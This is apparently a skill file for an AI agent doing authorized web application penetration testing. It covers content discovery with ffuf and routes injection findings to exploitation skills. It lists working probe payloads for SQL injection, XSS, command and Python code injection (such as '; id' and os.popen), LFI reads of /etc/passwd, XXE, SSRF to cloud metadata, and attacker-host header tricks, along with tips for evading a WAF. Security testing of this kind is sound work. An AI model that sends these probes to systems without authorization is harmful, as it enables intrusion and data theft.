---
name: web-discovery
description: >
  Discover web application injection points and route to the correct
  exploitation skill during authorized penetration testing.
keywords:
  - find vulns
  - fuzz the target
  - test for injection
  - parameter discovery
  - content discovery
  - web recon
  - find hidden parameters
  - test this endpoint
  - what's vulnerable
  - start web testing
  - web app pentest
  - hunt for bugs
tools:
  - ffuf
  - arjun
  - paramspider
  - burpsuite
opsec: low
---

# Web Vulnerability Discovery

You are helping a penetration tester discover vulnerabilities in a web
application. Your job is to find hidden content, discover parameters, test for
injection points, and route to the correct exploitation skill based on observed
responses. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it and wait for user approval. Explain each phase. Ask before
  running scans. Present findings. Show decision tree logic when routing.
- **Autonomous**: Run all discovery phases sequentially. Auto-triage findings by
  severity. Route to exploitation skills for confirmed injection points. Report
  discovery summary at each phase boundary.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (scan completed,
  parameter discovered, vulnerability indicator found, routing to technique skill):
  `### [YYYY-MM-DD HH:MM:SS] web-discovery → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `discovery-ffuf-results.txt`, `discovery-param-fuzz.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[web-discovery] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] web-discovery → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.

## Skill Routing Is Mandatory

When this skill's routing tables say to route to a skill, you MUST load and
follow that skill:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

Do NOT execute the technique inline — even if the attack is trivial or you
already know the answer. Skills contain operator-specific methodology,
client-scoped payloads, and edge-case handling that general knowledge does not.

This applies in both guided and autonomous modes. Autonomous mode means you
make routing decisions without asking — it does not mean you skip skills.

If you need a skill but don't know the exact name, use
`search_skills("description of what you need")` to find it. Verify the returned
description matches your scenario before loading.

### Scope Boundary

This skill's scope is **web application content discovery, parameter discovery,
and injection point identification**. You identify injection points — you do
not exploit them. The moment you confirm a vulnerability type, STOP — update
state.md and route to the appropriate technique skill. Do not execute
exploitation commands inline.

You MUST NOT:
- Perform SQL injection exploitation (UNION queries, data extraction, OS command
  execution) — route to the appropriate **sql-injection-*** skill
- Perform XSS exploitation (cookie theft, DOM manipulation) — route to the
  appropriate **xss-*** skill
- Perform SSTI exploitation (RCE payloads) — route to the appropriate
  **ssti-*** skill
- Perform command injection exploitation (`id`, `whoami`, reverse shells,
  system enumeration) — route to **command-injection**
- Perform Python code injection exploitation (`__import__('os')`, file reads,
  reverse shells) — route to **python-code-injection**
- Perform deserialization exploitation (gadget chains, RCE payloads) — route
  to **deserialization-java**, **deserialization-php**, or **deserialization-dotnet**
- Perform any other technique-specific exploitation — route to the named skill

When you identify an injection point: update state.md, log to activity.md,
and invoke the technique skill. Do not continue past discovery.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip endpoints and parameters already tested
- Focus on new targets or services added since last run
- Check which vulns are already confirmed (avoid duplicate testing)
- Review Blocked section for techniques that failed (try alternatives)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new endpoints, parameters, or services discovered
- **Vulns**: Add confirmed injection points as one-liners with status `[found]`
- **Blocked**: Record discovery techniques that returned no results

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Target URL or scope defined
- Proxy configured (Burp Suite or similar)
- Wordlists available (SecLists: `apt install seclists` or `/usr/share/seclists/`)
- Tools: `ffuf`, `arjun` (`pip install arjun`), `paramspider` (`pip install paramspider`)

## Step 1: Content Discovery

Find hidden endpoints, directories, and files.

**Wordlist priority:** Start with `quickhits.txt` for fast coverage of common
high-value paths (admin panels, config files, backup files, known endpoints).
Fall back to `raft-small-words.txt` only if quickhits returns nothing
interesting. Use `raft-medium-*` for thorough sweeps when time allows.

```bash
# Quick high-value path check (run first)
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# Directory discovery (if quickhits insufficient)
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# File discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u https://TARGET/FUZZ -mc all -fc 404

# Technology-specific files
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://TARGET/FUZZ -e .php,.asp,.aspx,.jsp,.json,.xml,.yaml,.yml,.bak,.old,.swp,.git \
  -mc all -fc 404

# API endpoint discovery
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://TARGET/api/FUZZ -mc all -fc 404

# Virtual host / subdomain discovery
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://TARGET -H "Host: FUZZ.TARGET" -mc all -fs <default-response-size>
```

## Step 2: Parameter Discovery

Find hidden or undocumented parameters on discovered endpoints.

```bash
# Arjun — automated parameter discovery (GET, POST, JSON, XML)
arjun -u https://TARGET/endpoint
arjun -u https://TARGET/endpoint -m GET POST JSON
arjun -u https://TARGET/endpoint --headers "Authorization: Bearer TOKEN"

# ParamSpider — mine parameters from web archives
paramspider -d TARGET

# ffuf parameter brute-force
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://TARGET/endpoint?FUZZ=test" -mc all -fs <baseline-size>
```

## Step 3: Injection Point Testing

Test discovered parameters with polyglot and type-specific probes.

### Quick Polyglot Probes

These trigger detectable behavior across multiple vulnerability classes:
```
'"><{{7*7}}${7*7}%{{7*7}}
```
```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//
```
```
' OR '1'='1' --
```
```
{{7*7}}${7*7}<%= 7*7 %>
```

### Per-Class Test Payloads

For each class below: inject the probes, observe the response. **The moment any
probe triggers** (error message, evaluated output, time delay, callback), STOP.
Do not try more payloads. Do not attempt exploitation. Update
`engagement/state.md` and route to the skill listed in the `→ ROUTE` callout
immediately. The technique skill has the methodology — you do not.

**SQL Injection:**
```
'
"
')
")
' OR '1'='1
1 AND 1=2
1 AND 1=1
1' ORDER BY 1--+
```

> **→ ROUTE ON HIT:** DB error with syntax details → **sql-injection-error**. Different content for `1=1` vs `1=2` → **sql-injection-blind**. Delay on `SLEEP(5)`/`WAITFOR DELAY` → **sql-injection-blind**. `ORDER BY`/`UNION SELECT` returns data → **sql-injection-union**. Stacked queries execute → **sql-injection-stacked**. See Step 4 routing table for DBMS fingerprinting.

**SSTI:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

> **→ ROUTE ON HIT:** `49` from `{{7*7}}` → disambiguate: `{{7*'7'}}` returns `7777777` = **ssti-jinja2**, returns `49` = **ssti-twig**. `49` from `${7*7}` → **ssti-freemarker**. `49` from `<%= 7*7 %>` → ERB SSTI (use `search_skills("ERB SSTI")`).

**XSS:**
```
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
'-alert(1)-'
javascript:alert(1)
```

> **→ ROUTE ON HIT:** Payload reflected verbatim in HTML response → **xss-reflected**. Payload persists on subsequent page loads → **xss-stored**. Payload appears in DOM via JS but not in HTTP response body → **xss-dom**.

**Command Injection:**
```
; id
| id
`id`
$(id)
; sleep 5
```

> **→ ROUTE ON HIT:** Command output (`uid=`, hostname) in response → **command-injection**. Delay on `sleep 5` but no output → **command-injection** (blind section). Callback received → **command-injection** (OOB section).

**Python Code Injection:**
```
7*7
str(7*7)
'A'*3
__import__('os').popen('id').read()
```

> **→ ROUTE ON HIT:** `49` from bare `7*7` but `{{7*7}}` returns literal → **python-code-injection**. Python traceback (`SyntaxError`, `NameError`, `eval()` in stack trace) → **python-code-injection**. This is NOT command injection (shell operators `;`, `|` don't work) and NOT SSTI (template delimiters `{{}}` return literal).

**SSRF:**
```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://COLLABORATOR.oastify.com
```

> **→ ROUTE ON HIT:** Localhost/internal content returned → **ssrf**. Callback received but no response data → **ssrf** (blind section). Cloud metadata returned → **ssrf** (cloud section).

**LFI:**
```
../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

> **→ ROUTE ON HIT:** File contents (`root:x:0:0:`) in response → **lfi**. Base64 from `php://filter` → **lfi** (PHP wrappers). Remote file loaded and executed → **lfi** (RFI section).

**XXE** (inject into XML input or Content-Type: application/xml):
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

> **→ ROUTE ON HIT:** File contents in XML response → **xxe**. Callback from XML parsing → **xxe** (blind/OOB section). Error message with file contents → **xxe** (error section).

**Deserialization** (check for serialized objects in parameters, cookies, headers):
```
# Java: look for AC ED 00 05 (hex) or rO0AB (base64)
rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbs...

# PHP: look for O: or a: prefix
O:8:"stdClass":1:{s:1:"a";s:1:"b";}

# .NET: look for AAEAAAD (base64) or $type in JSON
{"$type":"System.Object"}
```

> **→ ROUTE ON HIT:** Java serialized data (`rO0AB`, `AC ED 00 05`) → **deserialization-java**. PHP serialized data (`O:`, `a:`) → **deserialization-php**. .NET serialized data (`AAEAAAD`, `$type`, ViewState) → **deserialization-dotnet**. Error mentioning `ObjectInputStream`/`unserialize`/`BinaryFormatter` → route by language.

**JWT** (check Authorization headers, cookies, and parameters for `eyJ` prefix):
```
# Identify JWTs — three Base64URL segments separated by dots
# Header always starts with eyJ (base64 of {"...)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature

# Decode header to check algorithm
echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

> **→ ROUTE ON HIT:** JWT found (`eyJ...` in header/cookie/parameter) → **jwt-attacks**. `alg: none` or weak HMAC suspected → **jwt-attacks** (alg:none / brute force). RSA JWT with JWKS endpoint → **jwt-attacks** (key confusion). `kid`/`jku`/`x5u` in header → **jwt-attacks** (header injection).

**File Upload** (test upload endpoints for bypass opportunities):
```
# Find upload endpoints (forms, API, drag-and-drop handlers)
# Upload a benign file, note:
# - Allowed extensions
# - Where the file is stored (URL in response? predictable path?)
# - Whether the file is served back with original Content-Type

# Test extension bypass — try alternative extensions for the target language:
# PHP: .phtml, .pht, .php5, .php7, .phar, .phps, .php.jpg
# ASP: .aspx, .ashx, .asmx, .asp, .config, .shtml
# JSP: .jspx, .jsw, .jsv, .jspf, .war
# Test double extension: shell.php.jpg, shell.jpg.php

# Test config file upload:
# .htaccess (Apache), web.config (IIS), .user.ini (PHP-FPM)
```

> **→ ROUTE ON HIT:** Uploaded file executed server-side → **file-upload-bypass**. Alternative extension accepted → **file-upload-bypass**. Config file accepted (`.htaccess`, `web.config`) → **file-upload-bypass** (config exploitation).

**NoSQL Injection** (test JSON APIs and Node.js backends):
```
# URL-encoded operator injection
param[$ne]=test
param[$gt]=
param[$exists]=true

# JSON body operator injection
{"param": {"$ne": ""}}
{"param": {"$gt": ""}}
{"param": {"$regex": ".*"}}
```

> **→ ROUTE ON HIT:** Auth bypass with `$ne`/`$gt`/`$regex` → **nosql-injection**. MongoDB error (`MongoError`, `$operator` in stack) → **nosql-injection**. Different response for operators vs normal input → **nosql-injection** (blind section).

**LDAP Injection** (test login forms and search fields backed by LDAP/AD):
```
# Wildcard — if login succeeds or search returns results, LDAP may be in play
*

# Filter breakout — triggers error if LDAP filter is parsed
)(cn=*))(|(cn=*

# Always-true injection in AND context
admin)(&)

# Error trigger
\
```

> **→ ROUTE ON HIT:** `*` bypasses auth or returns extra results → **ldap-injection**. LDAP error (`ldap_search`, `Bad search filter`) → **ldap-injection**. Filter breakout changes response → **ldap-injection** (filter breakout).

**Request Smuggling** (test for CL/TE desync on multi-tier architectures):
```
# Check for mixed HTTP version (H2 front-end, H1 back-end)
curl -sI --http2 https://TARGET/ -o /dev/null -w '%{http_version}\n'

# Check headers for reverse proxy / CDN indicators
curl -sI https://TARGET/ | grep -iE 'server|via|x-cache|x-forwarded'

# Automated detection with smuggler.py
python3 -m smuggler -u https://TARGET/
```

> **→ ROUTE ON HIT:** Timeout/405 from CL.TE/TE.CL probes → **request-smuggling**. Unexpected response on pipelined request → **request-smuggling**. HTTP/2 front with HTTP/1.1 back → **request-smuggling** (H2 downgrade).

**IDOR / Broken Access Control** (test endpoints that reference objects by ID):
```
# Identify object references in API responses
# Look for: sequential integers, UUIDs, MongoDB ObjectIds, encoded IDs
# Test: change the ID while keeping your auth session

# Horizontal: access another user's resource
GET /api/users/OTHER_ID/profile  (with your session cookie)

# Vertical: access admin endpoints
GET /api/admin/users  (with low-priv session)

# Method tampering: try PUT/DELETE on read-only resources
PUT /api/users/OTHER_ID/profile
DELETE /api/users/OTHER_ID/documents/123
```

> **→ ROUTE ON HIT:** Different user's data returned → **idor** (horizontal). Admin data with low-priv session → **idor** (vertical). Write on another user's resource succeeds → **idor** (state-changing).

**CORS Misconfiguration** (check cross-origin headers on sensitive endpoints):
```bash
# Test origin reflection
curl -sI -H "Origin: https://evil.com" https://TARGET/api/endpoint \
  | grep -i "access-control"

# Test null origin
curl -sI -H "Origin: null" https://TARGET/api/endpoint \
  | grep -i "access-control"

# Look for: Access-Control-Allow-Origin reflecting input + Allow-Credentials: true
```

> **→ ROUTE ON HIT:** Origin reflected + `Allow-Credentials: true` → **cors-misconfiguration**. Null origin accepted + credentials → **cors-misconfiguration**. Wildcard `*` on sensitive endpoint → **cors-misconfiguration**.

**CSRF** (check state-changing endpoints for token protection):
```
# Capture a POST request to a state-changing endpoint (change email, password, etc.)
# Remove or empty the CSRF token parameter — does the request still succeed?
# Check SameSite cookie attribute:
curl -sI https://TARGET/login | grep -i "set-cookie" | grep -i "samesite"
# Check for custom header requirements (X-CSRF-Token, X-Requested-With)
```

> **→ ROUTE ON HIT:** Request succeeds without CSRF token → **csrf**. Token removed/emptied still works → **csrf** (token bypass). `SameSite=None` or missing → **csrf** (SameSite bypass). State-change via GET → **csrf** (GET-based).

**OAuth / OpenID Connect** (check for OAuth-based authentication):
```bash
# Detect OAuth endpoints
curl -s "https://TARGET/.well-known/openid-configuration" | jq .

# Look for OAuth parameters in login flow:
# client_id, redirect_uri, response_type, state, scope
# Check Authorization header for Bearer tokens
# Check for social login buttons (Google, Facebook, GitHub, Apple)
```

> **→ ROUTE ON HIT:** OAuth login flow detected → **oauth-attacks**. `redirect_uri` accepts arbitrary domains → **oauth-attacks** (redirect URI bypass). Missing/unvalidated `state` parameter → **oauth-attacks** (state bypass). JWT tokens found → **jwt-attacks** first, then **oauth-attacks** if OAuth context.

**Password Reset** (check reset flow for token theft vectors):
```
# Request password reset, analyze the email link:
# - Does the link domain come from the Host header?
# - Is the token short/predictable?
# - Does the reset page load external resources (Referer leakage)?
# Test Host header override:
curl -s -X POST -H "X-Forwarded-Host: attacker.com" \
  -d "email=test@target.com" "https://TARGET/reset-password"
```

> **→ ROUTE ON HIT:** Reset link domain changes with Host header → **password-reset-poisoning**. Short/predictable token → **password-reset-poisoning** (token weakness). Reset page loads external resources → **password-reset-poisoning** (Referer leakage).

**2FA / MFA** (check for second-factor bypass):
```
# After login with valid credentials, test 2FA enforcement:
# - Can you skip 2FA by navigating directly to /dashboard?
# - Does submitting an empty/null code work?
# - Is there rate limiting on OTP attempts?
# - Check SameSite cookie attribute on session cookies
# - Check for alternative login paths (OAuth, API, mobile)
```

> **→ ROUTE ON HIT:** 2FA prompt found → **2fa-bypass**. Direct navigation bypasses 2FA → **2fa-bypass** (force browse). Empty/null OTP accepted → **2fa-bypass** (null code). No rate limit on OTP → **2fa-bypass** (brute-force).

**Race Conditions** (check state-changing endpoints for concurrent request handling):
```
# Identify race-susceptible endpoints:
# - Coupon/promo code redemption
# - Balance transfers and payments
# - Vote/like/rating endpoints
# - Single-use token consumption (invite codes, reset tokens)

# Check HTTP/2 support (enables single-packet attack)
curl -sI --http2 https://TARGET/ -o /dev/null -w '%{http_version}\n'

# Quick race test: send identical POST to state-changing endpoint
# using Burp Repeater "Send group in parallel" (HTTP/2)
# or duplicate tabs × 10-20 and fire simultaneously
```

> **→ ROUTE ON HIT:** State-changing endpoint without idempotency → **race-condition**. Token accepted multiple times → **race-condition** (token reuse). Rate limit bypassable via H2 → **race-condition** (rate limit bypass).

## Step 4: Response Analysis & Routing

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

Analyze responses from Step 3 to identify vulnerability type, then route to
the correct exploitation skill.

**Routing is mandatory.** When a match is found in the tables below, STOP.
Load the skill — call `get_skill("skill-name")` and follow its instructions. Pass: the confirmed injection point
(URL, parameter, method), observed response behavior, suspected DBMS (if SQL),
current mode, and any payloads that already succeeded. Do not execute
exploitation commands inline — even if the technique seems simple.

### SQL Injection

| Response Pattern | Indicates | Route To |
|---|---|---|
| DB error message with syntax details | Error-based SQLi | **sql-injection-error** |
| Different content for `1=1` vs `1=2` | Boolean-based blind | **sql-injection-blind** |
| Delay with `SLEEP(5)` / `WAITFOR DELAY` | Time-based blind | **sql-injection-blind** |
| `ORDER BY N` works, `UNION SELECT` returns data | Union-based | **sql-injection-union** |
| `;` followed by second statement executes (e.g., `; WAITFOR DELAY`) | Stacked queries | **sql-injection-stacked** |
| Input stored, later causes SQL error in different context | Second-order | **sql-injection-stacked** |

**DBMS fingerprinting** (inject as tautology):

| Payload | If True |
|---|---|
| `conv('a',16,2)=conv('a',16,2)` | MySQL |
| `@@CONNECTIONS=@@CONNECTIONS` | MSSQL |
| `5::int=5` | PostgreSQL |
| `ROWNUM=ROWNUM` | Oracle |
| `sqlite_version()=sqlite_version()` | SQLite |

### Server-Side Template Injection

| Response Pattern | Indicates | Route To |
|---|---|---|
| `49` from `{{7*7}}` | Jinja2 or Twig | **ssti-jinja2** or **ssti-twig** |
| `49` from `${7*7}` | Freemarker / Java EL | **ssti-freemarker** |
| `49` from `<%= 7*7 %>` | ERB (Ruby) | Check ~/docs for ERB SSTI |

**Engine disambiguation** (if `{{7*7}}` returns `49`):

| Follow-Up | Result | Engine |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |

### XSS

| Response Pattern | Route To |
|---|---|
| Payload reflected verbatim in HTML | **xss-reflected** |
| Payload persists on subsequent loads | **xss-stored** |
| Payload appears in DOM via JS (not in HTTP response) | **xss-dom** |

### SSRF

| Response Pattern | Route To |
|---|---|
| Localhost/internal content returned | **ssrf** |
| Callback received but no response data | **ssrf** (blind section) |
| Cloud metadata returned (169.254.169.254) | **ssrf** (cloud section) |

### Command Injection

| Response Pattern | Route To |
|---|---|
| Command output (`uid=`, hostname) in response | **command-injection** |
| Delay with `sleep 5` but no output | **command-injection** (blind section) |
| Callback received | **command-injection** (OOB section) |

### Python Code Injection

| Response Pattern | Route To |
|---|---|
| `49` from bare `7*7` but `{{7*7}}` returns literal (not SSTI) | **python-code-injection** |
| Python traceback (`SyntaxError`, `NameError`, `eval()` in stack) | **python-code-injection** |
| `__import__` or `__builtins__` in error message | **python-code-injection** |
| Shell operators (`;`, `\|`) fail but Python expressions evaluate | **python-code-injection** |

**Disambiguation from Command Injection and SSTI:**

| Probe | Command Injection | Python Code Injection | SSTI |
|---|---|---|---|
| `; id` | Returns `uid=...` | Error or literal | Error or literal |
| `7*7` | Literal `7*7` | Returns `49` | Literal `7*7` |
| `{{7*7}}` | Literal | Literal `{{7*7}}` | Returns `49` |

### LFI / File Inclusion

| Response Pattern | Route To |
|---|---|
| File contents (`root:x:0:0:`) in response | **lfi** |
| Base64 from `php://filter` | **lfi** (PHP wrappers) |
| Remote file loaded and executed | **lfi** (RFI section) |

### XXE

| Response Pattern | Route To |
|---|---|
| File contents in XML response | **xxe** |
| Callback from XML parsing | **xxe** (blind/OOB section) |
| Error message with file contents | **xxe** (error section) |

### Deserialization

| Response Pattern | Route To |
|---|---|
| Java serialized object (`rO0AB`, `AC ED 00 05`) in parameter/cookie | **deserialization-java** |
| PHP serialized object (`O:`, `a:`) in parameter/cookie | **deserialization-php** |
| .NET serialized data (`AAEAAAD`, `$type` in JSON) or ViewState | **deserialization-dotnet** |
| Error mentioning `ObjectInputStream`, `unserialize`, `BinaryFormatter` | Route by language (Java/PHP/.NET) |

### JWT

| Response Pattern | Route To |
|---|---|
| JWT found in auth header, cookie, or parameter (`eyJ...`) | **jwt-attacks** |
| `alg` set to `none` or weak HMAC key suspected | **jwt-attacks** (alg:none / brute force) |
| RSA-signed JWT with public key available (JWKS endpoint) | **jwt-attacks** (key confusion) |
| `kid`, `jku`, or `x5u` present in JWT header | **jwt-attacks** (header injection) |

### NoSQL Injection

| Response Pattern | Route To |
|---|---|
| Auth bypass with `$ne`/`$gt`/`$regex` operators | **nosql-injection** |
| MongoDB error (`MongoError`, `$operator` in stack trace) | **nosql-injection** |
| Different response for `$exists`/`$ne` vs normal input | **nosql-injection** (blind section) |
| Node.js/Express backend with JSON API | **nosql-injection** (test operators) |

### LDAP Injection

| Response Pattern | Route To |
|---|---|
| `*` in password field bypasses auth or returns different user | **ldap-injection** (wildcard bypass) |
| Error mentioning `ldap_search`, `Bad search filter`, `InvalidSearchFilterException` | **ldap-injection** |
| `)(cn=*)` breakout changes response or triggers LDAP error | **ldap-injection** (filter breakout) |
| Corporate app with AD/LDAP backend, login or directory search | **ldap-injection** (test wildcards) |

### File Upload

| Response Pattern | Route To |
|---|---|
| Uploaded file executed server-side | **file-upload-bypass** |
| Extension blocked but alternative accepted | **file-upload-bypass** |
| Config file upload accepted (.htaccess, web.config) | **file-upload-bypass** (config exploitation) |

### Request Smuggling

| Response Pattern | Route To |
|---|---|
| Timeout or 405 from CL.TE/TE.CL detection probes | **request-smuggling** |
| Unexpected response on second pipelined request | **request-smuggling** |
| HTTP/2 front-end with HTTP/1.1 back-end (mixed version) | **request-smuggling** (H2 downgrade) |
| `Upgrade: h2c` forwarded by proxy | **request-smuggling** (h2c smuggling) |

### IDOR / Broken Access Control

| Response Pattern | Route To |
|---|---|
| Different user's data returned when ID is changed | **idor** (horizontal) |
| Admin/privileged data accessible with low-priv session | **idor** (vertical) |
| Write operation (PUT/DELETE) succeeds on another user's resource | **idor** (state-changing) |
| Sequential/predictable IDs in API responses | **idor** (enumeration) |

### CORS Misconfiguration

| Response Pattern | Route To |
|---|---|
| `Access-Control-Allow-Origin` reflects arbitrary origin + `Allow-Credentials: true` | **cors-misconfiguration** (origin reflection) |
| `Access-Control-Allow-Origin: null` + `Allow-Credentials: true` | **cors-misconfiguration** (null origin) |
| `Access-Control-Allow-Origin: *` on sensitive unauthenticated endpoint | **cors-misconfiguration** (wildcard) |
| Subdomain origin trusted + XSS on a subdomain | **cors-misconfiguration** (subdomain trust) |

### CSRF

| Response Pattern | Route To |
|---|---|
| State-changing endpoint accepts request without CSRF token | **csrf** (missing token) |
| CSRF token present but removing/emptying it still works | **csrf** (token bypass) |
| SameSite=None or no SameSite attribute on session cookie | **csrf** (SameSite bypass) |
| GET request performs state-changing action | **csrf** (GET-based) |

### OAuth / OpenID Connect

| Response Pattern | Route To |
|---|---|
| OAuth login flow detected (social login, SSO) | **oauth-attacks** |
| redirect_uri accepts arbitrary or manipulated domains | **oauth-attacks** (redirect URI bypass) |
| Missing or unvalidated state parameter in OAuth flow | **oauth-attacks** (state bypass) |
| OpenID Connect discovery endpoint found | **oauth-attacks** (OIDC attacks) |
| JWT tokens in Authorization headers or cookies | **jwt-attacks** (then **oauth-attacks** if OAuth context) |

### Password Reset

| Response Pattern | Route To |
|---|---|
| Reset link domain changes with Host/X-Forwarded-Host header | **password-reset-poisoning** (host header poisoning) |
| Reset token is short, sequential, or predictable | **password-reset-poisoning** (token weakness) |
| Email parameter accepts multiple addresses or CRLF | **password-reset-poisoning** (email injection) |
| Reset page loads external resources (token in Referer) | **password-reset-poisoning** (Referer leakage) |

### 2FA / MFA

| Response Pattern | Route To |
|---|---|
| 2FA prompt found after password authentication | **2fa-bypass** |
| Direct navigation to authenticated pages bypasses 2FA | **2fa-bypass** (force browse) |
| Empty/null OTP submission accepted | **2fa-bypass** (null code bypass) |
| No rate limiting on OTP verification endpoint | **2fa-bypass** (brute-force) |
| OAuth/SSO login skips 2FA | **2fa-bypass** (alternative auth path) |

### Race Conditions

| Response Pattern | Route To |
|---|---|
| State-changing endpoint (coupon, transfer, vote) without idempotency controls | **race-condition** (limit-overrun) |
| Single-use token accepted multiple times under concurrent requests | **race-condition** (token reuse) |
| Rate limit bypassed via HTTP/2 multiplexed parallel requests | **race-condition** (rate limit bypass) |
| Multi-step operation with observable delay between check and action | **race-condition** (TOCTOU) |

Update `engagement/state.md` with any new targets, confirmed vulns, or blocked
techniques before routing.

When loading a technique skill via `get_skill()`, pass along: the confirmed
injection point (URL, parameter, method), observed response behavior, suspected
DBMS (if SQL), current mode, and any payloads that already succeeded.
Do not execute exploitation commands inline.

## Troubleshooting

### WAF Blocking Requests
```bash
# Rate limiting
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -rate 50

# Rotate User-Agents
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Auto-calibrate to filter noise
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -ac
```

### Too Many False Positives
```bash
# Baseline normal response size
curl -s https://TARGET/nonexistent-page | wc -c

# Filter by size (-fs), word count (-fw), or line count (-fl)
ffuf -c -w wordlist.txt -u https://TARGET/FUZZ -fs <baseline-size>
```

### Parameter Discovery Returns Nothing
- Try POST: `arjun -u URL -m POST`
- Try JSON body: `arjun -u URL -m JSON`
- Check JavaScript files for parameters (LinkFinder, JSParser)
- Mine Wayback Machine: `paramspider -d TARGET`
- Check Burp history for parameters seen in-session
